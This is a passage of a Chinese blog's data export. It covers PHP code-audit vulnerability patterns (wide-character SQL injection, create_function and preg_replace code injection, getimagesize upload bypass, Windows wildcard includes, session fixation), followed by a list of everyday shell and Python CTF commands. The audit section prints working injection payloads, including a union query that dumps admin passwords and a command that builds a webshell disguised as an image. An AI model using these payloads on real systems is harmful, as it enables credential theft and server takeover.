class=\"line\"><span class=\"string\">\"Select * from table where id='$id'\"</span> <span class=\"comment\"># 无注入</span></span><br><span class=\"line\"><span class=\"string\">\"Select * from table where id='\"</span>.$id.<span class=\"string\">\"' limit 1\"</span> <span class=\"comment\"># 无注入</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"宽字符注入\"><a href=\"#宽字符注入\" class=\"headerlink\" title=\"宽字符注入\"></a>宽字符注入</h2><p>原理<br>常见转码函数：<br>iconv()<br>mb_convert_encoding()<br>addslashes<br>防御：<br>用mysql_real_escape_string</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## ?username=tom&amp;password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+</span></span><br><span class=\"line\"><span class=\"comment\">## %df把\\给吃掉</span></span><br><span class=\"line\">$pwd = addslashes($pwd);</span><br><span class=\"line\">mysql_query(<span class=\"string\">\"SET NAMES gbk\"</span>);</span><br><span class=\"line\">$query = <span class=\"string\">\"select * from user where uname='\"</span>.$uname.<span class=\"string\">\"' and pwd='\"</span>.$pwd.<span class=\"string\">\"'\"</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"跳转无退出\"><a href=\"#跳转无退出\" class=\"headerlink\" title=\"跳转无退出\"></a>跳转无退出</h2><p>原理:<br>没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 1</span></span><br><span class=\"line\"><span class=\"keyword\">$this</span>-&gt;myclass-&gt;notice(<span class=\"string\">'alert(\"系统已安装过\");window.location.href=\"'</span>.site_url().<span class=\"string\">'\";'</span>);</span><br><span class=\"line\"><span class=\"comment\">## 2</span></span><br><span class=\"line\">header(<span class=\"string\">\"location: ../index.php\"</span>);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"二次编码注入\"><a href=\"#二次编码注入\" class=\"headerlink\" title=\"二次编码注入\"></a>二次编码注入</h2><p>由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。<br>如%2527，两次urldecode会最后变成’<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">base64_decode -- 对使用 MIME base64 编码的数据进行解码</span><br><span class=\"line\">base64_encode -- 使用 MIME base64 对数据进行编码</span><br><span class=\"line\">rawurldecode -- 对已编码的 URL 字符串进行解码</span><br><span class=\"line\">rawurlencode -- 按照 RFC 1738 对 URL 进行编码</span><br><span class=\"line\">urldecode -- 解码已编码的 URL 字符串</span><br><span class=\"line\">urlencode -- 编码 URL 字符串</span><br><span class=\"line\">unserialize/serialize</span><br><span class=\"line\">字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"前端可控变量填充导致XSS\"><a href=\"#前端可控变量填充导致XSS\" class=\"headerlink\" title=\"前端可控变量填充导致XSS\"></a>前端可控变量填充导致XSS</h2><p>当html里的链接是变量时，易出现XSS。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=&#123;#、echo、print、printf、vprintf、<span class=\"tag\">&lt;<span class=\"name\">%=$test%</span>&gt;</span></span><br><span class=\"line\">img scr=&#123;#$list.link_logo#&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"命令执行函数\"><a href=\"#命令执行函数\" class=\"headerlink\" title=\"命令执行函数\"></a>命令执行函数</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system()</span><br><span class=\"line\">exec()</span><br><span class=\"line\">passthru()</span><br><span class=\"line\">pcntl_exec()</span><br><span class=\"line\">shell_exec()</span><br><span class=\"line\"><span class=\"keyword\">echo</span> `whoami`; <span class=\"comment\">//反引号调用shell_exec()函数</span></span><br><span class=\"line\">popen()和proc_open() <span class=\"comment\">//不会返回结果</span></span><br><span class=\"line\">array_map($arr,$array); <span class=\"comment\">//为数组的每个元素应用回调函数arr,如$arr = \"phpinfo\"</span></span><br><span class=\"line\">popen(<span class=\"string\">'whoami &gt;&gt;D: /2.txt'</span>, <span class=\"string\">'r'</span>); <span class=\"comment\">//这样就会在D下生成一个2.txt。</span></span><br><span class=\"line\">preg_replace()</span><br><span class=\"line\">ob_start()</span><br><span class=\"line\">array_map()</span><br></pre></td></tr></table></figure>\n<p>防范方法：<br>使用自定义函数或函数库来替代外部命令的功能<br>使用escapeshellarg 函数来处理命令参数<br>使用safe_mode_exec_dir 指定可执行文件的路径</p>\n<h3 id=\"create-function\"><a href=\"#create-function\" class=\"headerlink\" title=\"create_function\"></a>create_function</h3><p>create_function构造了一个return后面的语句为一个函数。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?sort_by=\"]);&#125;phpinfo();/*</span></span><br><span class=\"line\"><span class=\"comment\">#sort_function就变成了 return 1 * strnatcasecmp($a[\"\"]);&#125;phpinfo();/*\"], $b[\"\"]);&#125;phpinfo();/*\"]);</span></span><br><span class=\"line\"><span class=\"comment\">#前面闭合，然后把后面的全部注释掉了。</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sort_by=$_GET[<span class=\"string\">'sort_by'</span>];</span><br><span class=\"line\">$sorter=<span class=\"string\">'strnatcasecmp'</span>;</span><br><span class=\"line\">$databases=<span class=\"keyword\">array</span>(<span class=\"string\">'test'</span>,<span class=\"string\">'test'</span>);</span><br><span class=\"line\">$sort_function = <span class=\"string\">' return 1 * '</span> . $sorter . <span class=\"string\">'($a[\"'</span> . $sort_by . <span class=\"string\">'\"], $b[\"'</span> . $sort_by . <span class=\"string\">'\"]);'</span>;</span><br><span class=\"line\">usort($databases, create_function(<span class=\"string\">'$a, $b'</span>, $sort_function));</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"mb-ereg-replace-的-e模式\"><a href=\"#mb-ereg-replace-的-e模式\" class=\"headerlink\" title=\"mb_ereg_replace()的/e模式\"></a>mb_ereg_replace()的/e模式</h3><p>原理<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:</span><br><span class=\"line\">string mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= &quot;msr&quot;  ] )</span><br><span class=\"line\">当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"preg-replace-e模式执行命令\"><a href=\"#preg-replace-e模式执行命令\" class=\"headerlink\" title=\"preg_replace /e模式执行命令\"></a>preg_replace /e模式执行命令</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ?str=[phpinfo()]</span></span><br><span class=\"line\"><span class=\"comment\"># 这里使用/e模式，所以第二个参数\\\\1这里可以执行。</span></span><br><span class=\"line\"><span class=\"comment\"># 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\\\1，执行。</span></span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/\\[(.*)]/e\"</span>,<span class=\"string\">'\\\\1'</span>,$_GET[<span class=\"string\">'str'</span>]);</span><br></pre></td></tr></table></figure>\n<h2 id=\"动态函数执行\"><a href=\"#动态函数执行\" class=\"headerlink\" title=\"动态函数执行\"></a>动态函数执行</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func</span><br><span class=\"line\">call_user_func_array</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ?a=assert</span></span><br><span class=\"line\">call_user_func($_GET[<span class=\"string\">'a'</span>],$b);</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码执行\"><a href=\"#代码执行\" class=\"headerlink\" title=\"代码执行\"></a>代码执行</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert()</span><br><span class=\"line\">call_user_func()</span><br><span class=\"line\">call_user_func_array()</span><br><span class=\"line\">create_function()</span><br></pre></td></tr></table></figure>\n<h3 id=\"eval-和assert-代码执行\"><a href=\"#eval-和assert-代码执行\" class=\"headerlink\" title=\"eval()和assert()代码执行\"></a>eval()和assert()代码执行</h3><p>当assert()的参数为字符串时 可执行PHP代码。<br>区别：assert可以不加;，eval不可以不加;。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">\" phpinfo(); \"</span>);【√】 <span class=\"keyword\">eval</span>(<span class=\"string\">\" phpinfo() \"</span>);【X】</span><br><span class=\"line\">assert(<span class=\"string\">\" phpinfo(); \"</span>);【√】 assert(<span class=\"string\">\" phpinfo() \"</span>);【√】</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"优先级绕过\"><a href=\"#优先级绕过\" class=\"headerlink\" title=\"优先级绕过\"></a>优先级绕过</h2><p>原理：<br>如果运算符优先级相同，那运算符的结合方向决定了该如何运算<br><a href=\"http://php.net/manual/zh/language.operators.precedence.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/language.operators.precedence.php</a></p>\n<p>优先级：&amp;&amp;/|| 大于 = 大于 AND/OR</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ($test = true) and false; $test2 = (true &amp;&amp; false);</span></span><br><span class=\"line\">$test = <span class=\"keyword\">true</span> <span class=\"keyword\">and</span> <span class=\"keyword\">false</span>; var_dump($test);<span class=\"comment\">//bool(true) </span></span><br><span class=\"line\">$test2 = <span class=\"keyword\">true</span> &amp;&amp; <span class=\"keyword\">false</span>; var_dump($test2); <span class=\"comment\">//bool(false)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过</span></span><br><span class=\"line\">$test3 = is_numeric(<span class=\"string\">\"123\"</span>) <span class=\"keyword\">and</span> is_numeric(<span class=\"string\">\"anything false\"</span>); var_dump($test3); <span class=\"comment\">//bool(true)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"getimagesize图片判断绕过\"><a href=\"#getimagesize图片判断绕过\" class=\"headerlink\" title=\"getimagesize图片判断绕过\"></a>getimagesize图片判断绕过</h2><p>原理：<br>当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。<br>只要我们在文件头部加入GIF89a后可以上传任意后缀文件。</p>\n<p>生成小马图的方法：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat image.png webshell.php &gt; image.php</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 找上传点</span></span><br><span class=\"line\"><span class=\"comment\">## 文件头部加入GIF89a</span></span><br><span class=\"line\"><span class=\"comment\"># 1</span></span><br><span class=\"line\">$file = $request-&gt;getFiles();</span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(getimagesize($files[<span class=\"string\">'users'</span>][<span class=\"string\">'photo'</span>][<span class=\"string\">'tmp_name'</span>]))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          move_uploaded_file($files[<span class=\"string\">'users'</span>][<span class=\"string\">'photo'</span>][<span class=\"string\">'tmp_name'</span>], $filename);</span><br><span class=\"line\"><span class=\"comment\"># 3</span></span><br><span class=\"line\">$filesize = @getimagesize(<span class=\"string\">'/path/to/image.png'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($filesize) &#123;</span><br><span class=\"line\">    do_upload();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"lt-变-，windows-findfirstfile利用\"><a href=\"#lt-变-，windows-findfirstfile利用\" class=\"headerlink\" title=\"&lt;变*，windows findfirstfile利用\"></a>&lt;变*，windows findfirstfile利用</h2><p>原理：<br>Windows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。<br>执行过程中，字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。<br>所以：</p>\n<ol>\n<li>“&gt;””&gt;&gt;”可代替一个字符,”&lt;”可以代替后缀多个字符，”&lt;&lt;”可以代替包括文件名和后缀多个字符。所以一般使用&lt;&lt;</li>\n<li>“ 可以代替.</li>\n<li>文件名第一个字符是”.”的话，读取时可以忽略之</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>NO</th>\n<th>Status</th>\n<th>Function</th>\n<th>Type of operation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1.</td>\n<td>OK</td>\n<td>include()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>2.</td>\n<td>OK</td>\n<td>include_once()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>3.</td>\n<td>OK</td>\n<td>require()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>4.</td>\n<td>OK</td>\n<td>require_once()</td>\n<td>Include file</td>\n</tr>\n<tr>\n<td>5.</td>\n<td>OK</td>\n<td>fopen()</td>\n<td>Openfile</td>\n</tr>\n<tr>\n<td>6.</td>\n<td>OK</td>\n<td>ZipArchive::open()</td>\n<td>Archive file</td>\n</tr>\n<tr>\n<td>7.</td>\n<td>OK</td>\n<td>copy()</td>\n<td>Copyfile</td>\n</tr>\n<tr>\n<td>8.</td>\n<td>OK</td>\n<td>file_get_contents()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>9.</td>\n<td>OK</td>\n<td>parse_ini_file()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>10.</td>\n<td>OK</td>\n<td>readfile()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>11.</td>\n<td>OK</td>\n<td>file_put_contents()</td>\n<td>Write file</td>\n</tr>\n<tr>\n<td>12.</td>\n<td>OK</td>\n<td>mkdir()</td>\n<td>New directory creation</td>\n</tr>\n<tr>\n<td>13.</td>\n<td>OK</td>\n<td>tempnam()</td>\n<td>New file creation</td>\n</tr>\n<tr>\n<td>14.</td>\n<td>OK</td>\n<td>touch()</td>\n<td>New file creation</td>\n</tr>\n<tr>\n<td>15.</td>\n<td>OK</td>\n<td>move_uploaded_file()</td>\n<td>Move operation</td>\n</tr>\n<tr>\n<td>16.</td>\n<td>OK</td>\n<td>opendiit)</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>17.</td>\n<td>OK</td>\n<td>readdir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>18.</td>\n<td>OK</td>\n<td>rewinddir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>19.</td>\n<td>OK</td>\n<td>closedir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>20.</td>\n<td>FAIL</td>\n<td>rename()</td>\n<td>Move operation</td>\n</tr>\n<tr>\n<td>21.</td>\n<td>FAIL</td>\n<td>unlink()</td>\n<td>Delete file</td>\n</tr>\n<tr>\n<td>22.</td>\n<td>FAIL</td>\n<td>rmdir())</td>\n<td>Directory operation</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## ?file=1&lt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1\"txt</span></span><br><span class=\"line\">文件名为<span class=\"number\">1.</span>txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## ?file=1234.tx&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1234.&lt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1&lt;&lt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=1&lt;&lt;\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=123&gt;\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=&gt;&gt;&gt;4\"&gt;</span></span><br><span class=\"line\"><span class=\"comment\">## ?file=&lt;&lt;4\"&gt;</span></span><br><span class=\"line\">文件名为<span class=\"number\">1234.</span>txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'shell&lt;'</span>);  </span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'shell&lt;&lt;'</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'shell.p&gt;p'</span>); </span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'shell\"php'</span>);</span><br><span class=\"line\">fopen(<span class=\"string\">'.htacess'</span>);  <span class=\"comment\">//==&gt;fopen(\"htacess');</span></span><br><span class=\"line\">file_get_contents(<span class=\"string\">'C:boot.ini'</span>); <span class=\"comment\">//==&gt;  file_get_contents ('C:/boot.ini');</span></span><br><span class=\"line\">file_get_contents(<span class=\"string\">'C:/tmp/con.jpg'</span>); <span class=\"comment\">//此举将会无休无止地从CON设备读取0字节，直到遇到eof</span></span><br><span class=\"line\">file_put_contents(<span class=\"string\">'C:/tmp/con.jpg'</span>,chr(<span class=\"number\">0</span>×<span class=\"number\">07</span>));  <span class=\"comment\">//此举将会不断地使服务器发出类似哔哔的声音</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"处理value没有处理key\"><a href=\"#处理value没有处理key\" class=\"headerlink\" title=\"处理value没有处理key\"></a>处理value没有处理key</h2><p>foreach时,addslashes对获得的value值进行处理，但没有处理key。</p>\n<h2 id=\"用来目录遍历的特别函数\"><a href=\"#用来目录遍历的特别函数\" class=\"headerlink\" title=\"用来目录遍历的特别函数\"></a>用来目录遍历的特别函数</h2><p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094</a><br>lstat 函数</p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071</a><br>stream_resolve_include_path函数</p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688</a></p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457</a></p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453</a></p>\n<h2 id=\"绕过GD库图片渲染\"><a href=\"#绕过GD库图片渲染\" class=\"headerlink\" title=\"绕过GD库图片渲染\"></a>绕过GD库图片渲染</h2><p><a href=\"file/PHP代码审计_jpg_payload.zip\">jpg_payload.zip</a></p>\n<p>jpg_name.jpg是待GD处理的图片<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php jpg_payload.php &lt;jpg_name.jpg&gt;</span><br></pre></td></tr></table></figure></p>\n<p>生成好的图片，在经过如下代码处理后，依然能保留其中的shell：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    imagecreatefromjpeg(<span class=\"string\">'xxxx.jpg'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"会话固定\"><a href=\"#会话固定\" class=\"headerlink\" title=\"会话固定\"></a>会话固定</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_GET[<span class=\"string\">'phpsessid'</span>])) session_id($_GET[<span class=\"string\">'phpsessid'</span>]);<span class=\"comment\">//通过GET方法传递sessionid</span></span><br></pre></td></tr></table></figure>\n<p>通过get方法来设置session。所以可以通过CSRF：</p>\n<p><a href=\"http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123\" target=\"_blank\" rel=\"noopener\">http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123</a></p>\n<p>管理员点了我们就能使用此session进后台了。</p>\n<h2 id=\"end方法获取元素的问题\"><a href=\"#end方法获取元素的问题\" class=\"headerlink\" title=\"end方法获取元素的问题\"></a>end方法获取元素的问题</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$file = <span class=\"keyword\">array</span>(<span class=\"number\">1</span> =&gt; <span class=\"string\">'png'</span>, <span class=\"number\">0</span> =&gt; <span class=\"string\">'php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$ext = $file[count($file) - <span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">$ext = end($file);</span><br></pre></td></tr></table></figure>\n<p>两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。前者返回的是$filename[1]也就是png,后者直接返回数组排在最后面的元素php。</p>\n<h2 id=\"资料\"><a href=\"#资料\" class=\"headerlink\" title=\"资料\"></a>资料</h2><p>PHP代码审计分段讲解</p>\n<p><a href=\"https://github.com/bowu678/php_bugs\" target=\"_blank\" rel=\"noopener\">https://github.com/bowu678/php_bugs</a></p>\n<p><a href=\"https://github.com/jiangsir404/Audit-Learning\" target=\"_blank\" rel=\"noopener\">https://github.com/jiangsir404/Audit-Learning</a></p>\n<p><a href=\"https://read.douban.com/reader/ebook/16642056/\" target=\"_blank\" rel=\"noopener\">https://read.douban.com/reader/ebook/16642056/</a></p>"},{"title":"简单的命令（shell+python）","date":"2018-04-24T02:27:37.000Z","_content":"\n1. 统计文件中每个字符串的长度\n\n   > grep -o . file.txt | sort | uniq -c | sort -rn\n\n2. Python将16进制字符串转化为ascii码\n\n   > a = \"456e\"\n   >\n   > ''.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])\n\n3. Python将16进制字符串转为2进制字符串\n\n   > a = \"456e\"\n   >\n   > ''.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])\n\n4. Python二进制字符串转16进制字符串\n\n   > str = \"0100010101101110\"\n   >\n   > ''.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])\n\n5. hexdump使用\n\n   > hexdump [filename]  以16进制查看文件\n   >\n   > hexdumlp -C [filename] 以16进制查看文件同时显示ascii码\n\n6. 7z使用\n\n   > 7z x [压缩包]\n\n7. binwalk使用\n\n   > binwalk [filename] 查看文件信息\n   >\n   > binwalk -e [filename]  提取文件\n\n8. strings使用\n\n   > strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串\n\n9. base64使用\n\n   > echo [base64字符串] | base64 -d              base64解密\n   >\n   > echo [字符串] | base64                              base64加密\n\n10. debin,ubuntu删除所有带 rc 标记的dpkg包\n\n   > dpkg -l | grep ^rc | cut -d' ' -f3 | sudo xargs dpkg --purge\n\n11. 批量计算文件夹中所有文件md5值\n\n    > md5sum *\n\n12. LSB检查\n\n    > ```python\n    > >>> import Image\n    > >>> a=Image.open('zxczxc.png')\n    > >>> a.point(lambda i: 255 if i&1 else 0).show()\n    > ```\n\n13. 查看文件夹下边的某个字符串\n\n> grep -rn -A10 -B5 \"php_string_shuffle\" ./\n>\n> grep -rn -A10 -B5 \"php_string_shuffle\" -l ./          只列出文件名\n\n14. 监控目录变化\n\n    > watch -n2 ls -l /proc/11631/fd/\n\n15. dd命令使用\n\n    >  dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1\n\n16. shell文件去重\n\n    > sort filename | uniq\n\n17. socat启动一道pwn题目\n\n    > socat tcp-l:8080,fork exec:./note,reuseaddr\n\n18. exiftool使用\n\n    >exiftool [picture_name]\n    >\n    >exiftool -Exif:ImageDescription=\"%^&*()[]{}\" [picture_name]","source":"_posts/简单的一句话.md","raw":"---\ntitle: 简单的命令（shell+python）\ndate: 2018-04-24 10:27:37\ntags:\n---\n\n1. 统计文件中每个字符串的长度\n\n   > grep -o . file.txt | sort | uniq -c | sort -rn\n\n2. Python将16进制字符串转化为ascii码\n\n   > a = \"456e\"\n   >\n   > ''.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])\n\n3. Python将16进制字符串转为2进制字符串\n\n   > a = \"456e\"\n   >\n   > ''.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])\n\n4. Python二进制字符串转16进制字符串\n\n   > str = \"0100010101101110\"\n   >\n   > ''.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])\n\n5. hexdump使用\n\n   > hexdump [filename]  以16进制查看文件\n   >\n   > hexdumlp -C [filename] 以16进制查看文件同时显示ascii码\n\n6. 7z使用\n\n   > 7z x [压缩包]\n\n7. binwalk使用\n\n   > binwalk [filename] 查看文件信息\n   >\n   > binwalk -e [filename]  提取文件\n\n8. strings使用\n\n   > strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串\n\n9. base64使用\n\n   > echo [base64字符串] | base64 -d              base64解密\n   >\n   > echo [字符串] | base64                              base64加密\n\n10. debin,ubuntu删除所有带 rc 标记的dpkg包\n\n   > dpkg -l | grep ^rc | cut -d' ' -f3 | sudo xargs dpkg --purge\n\n11. 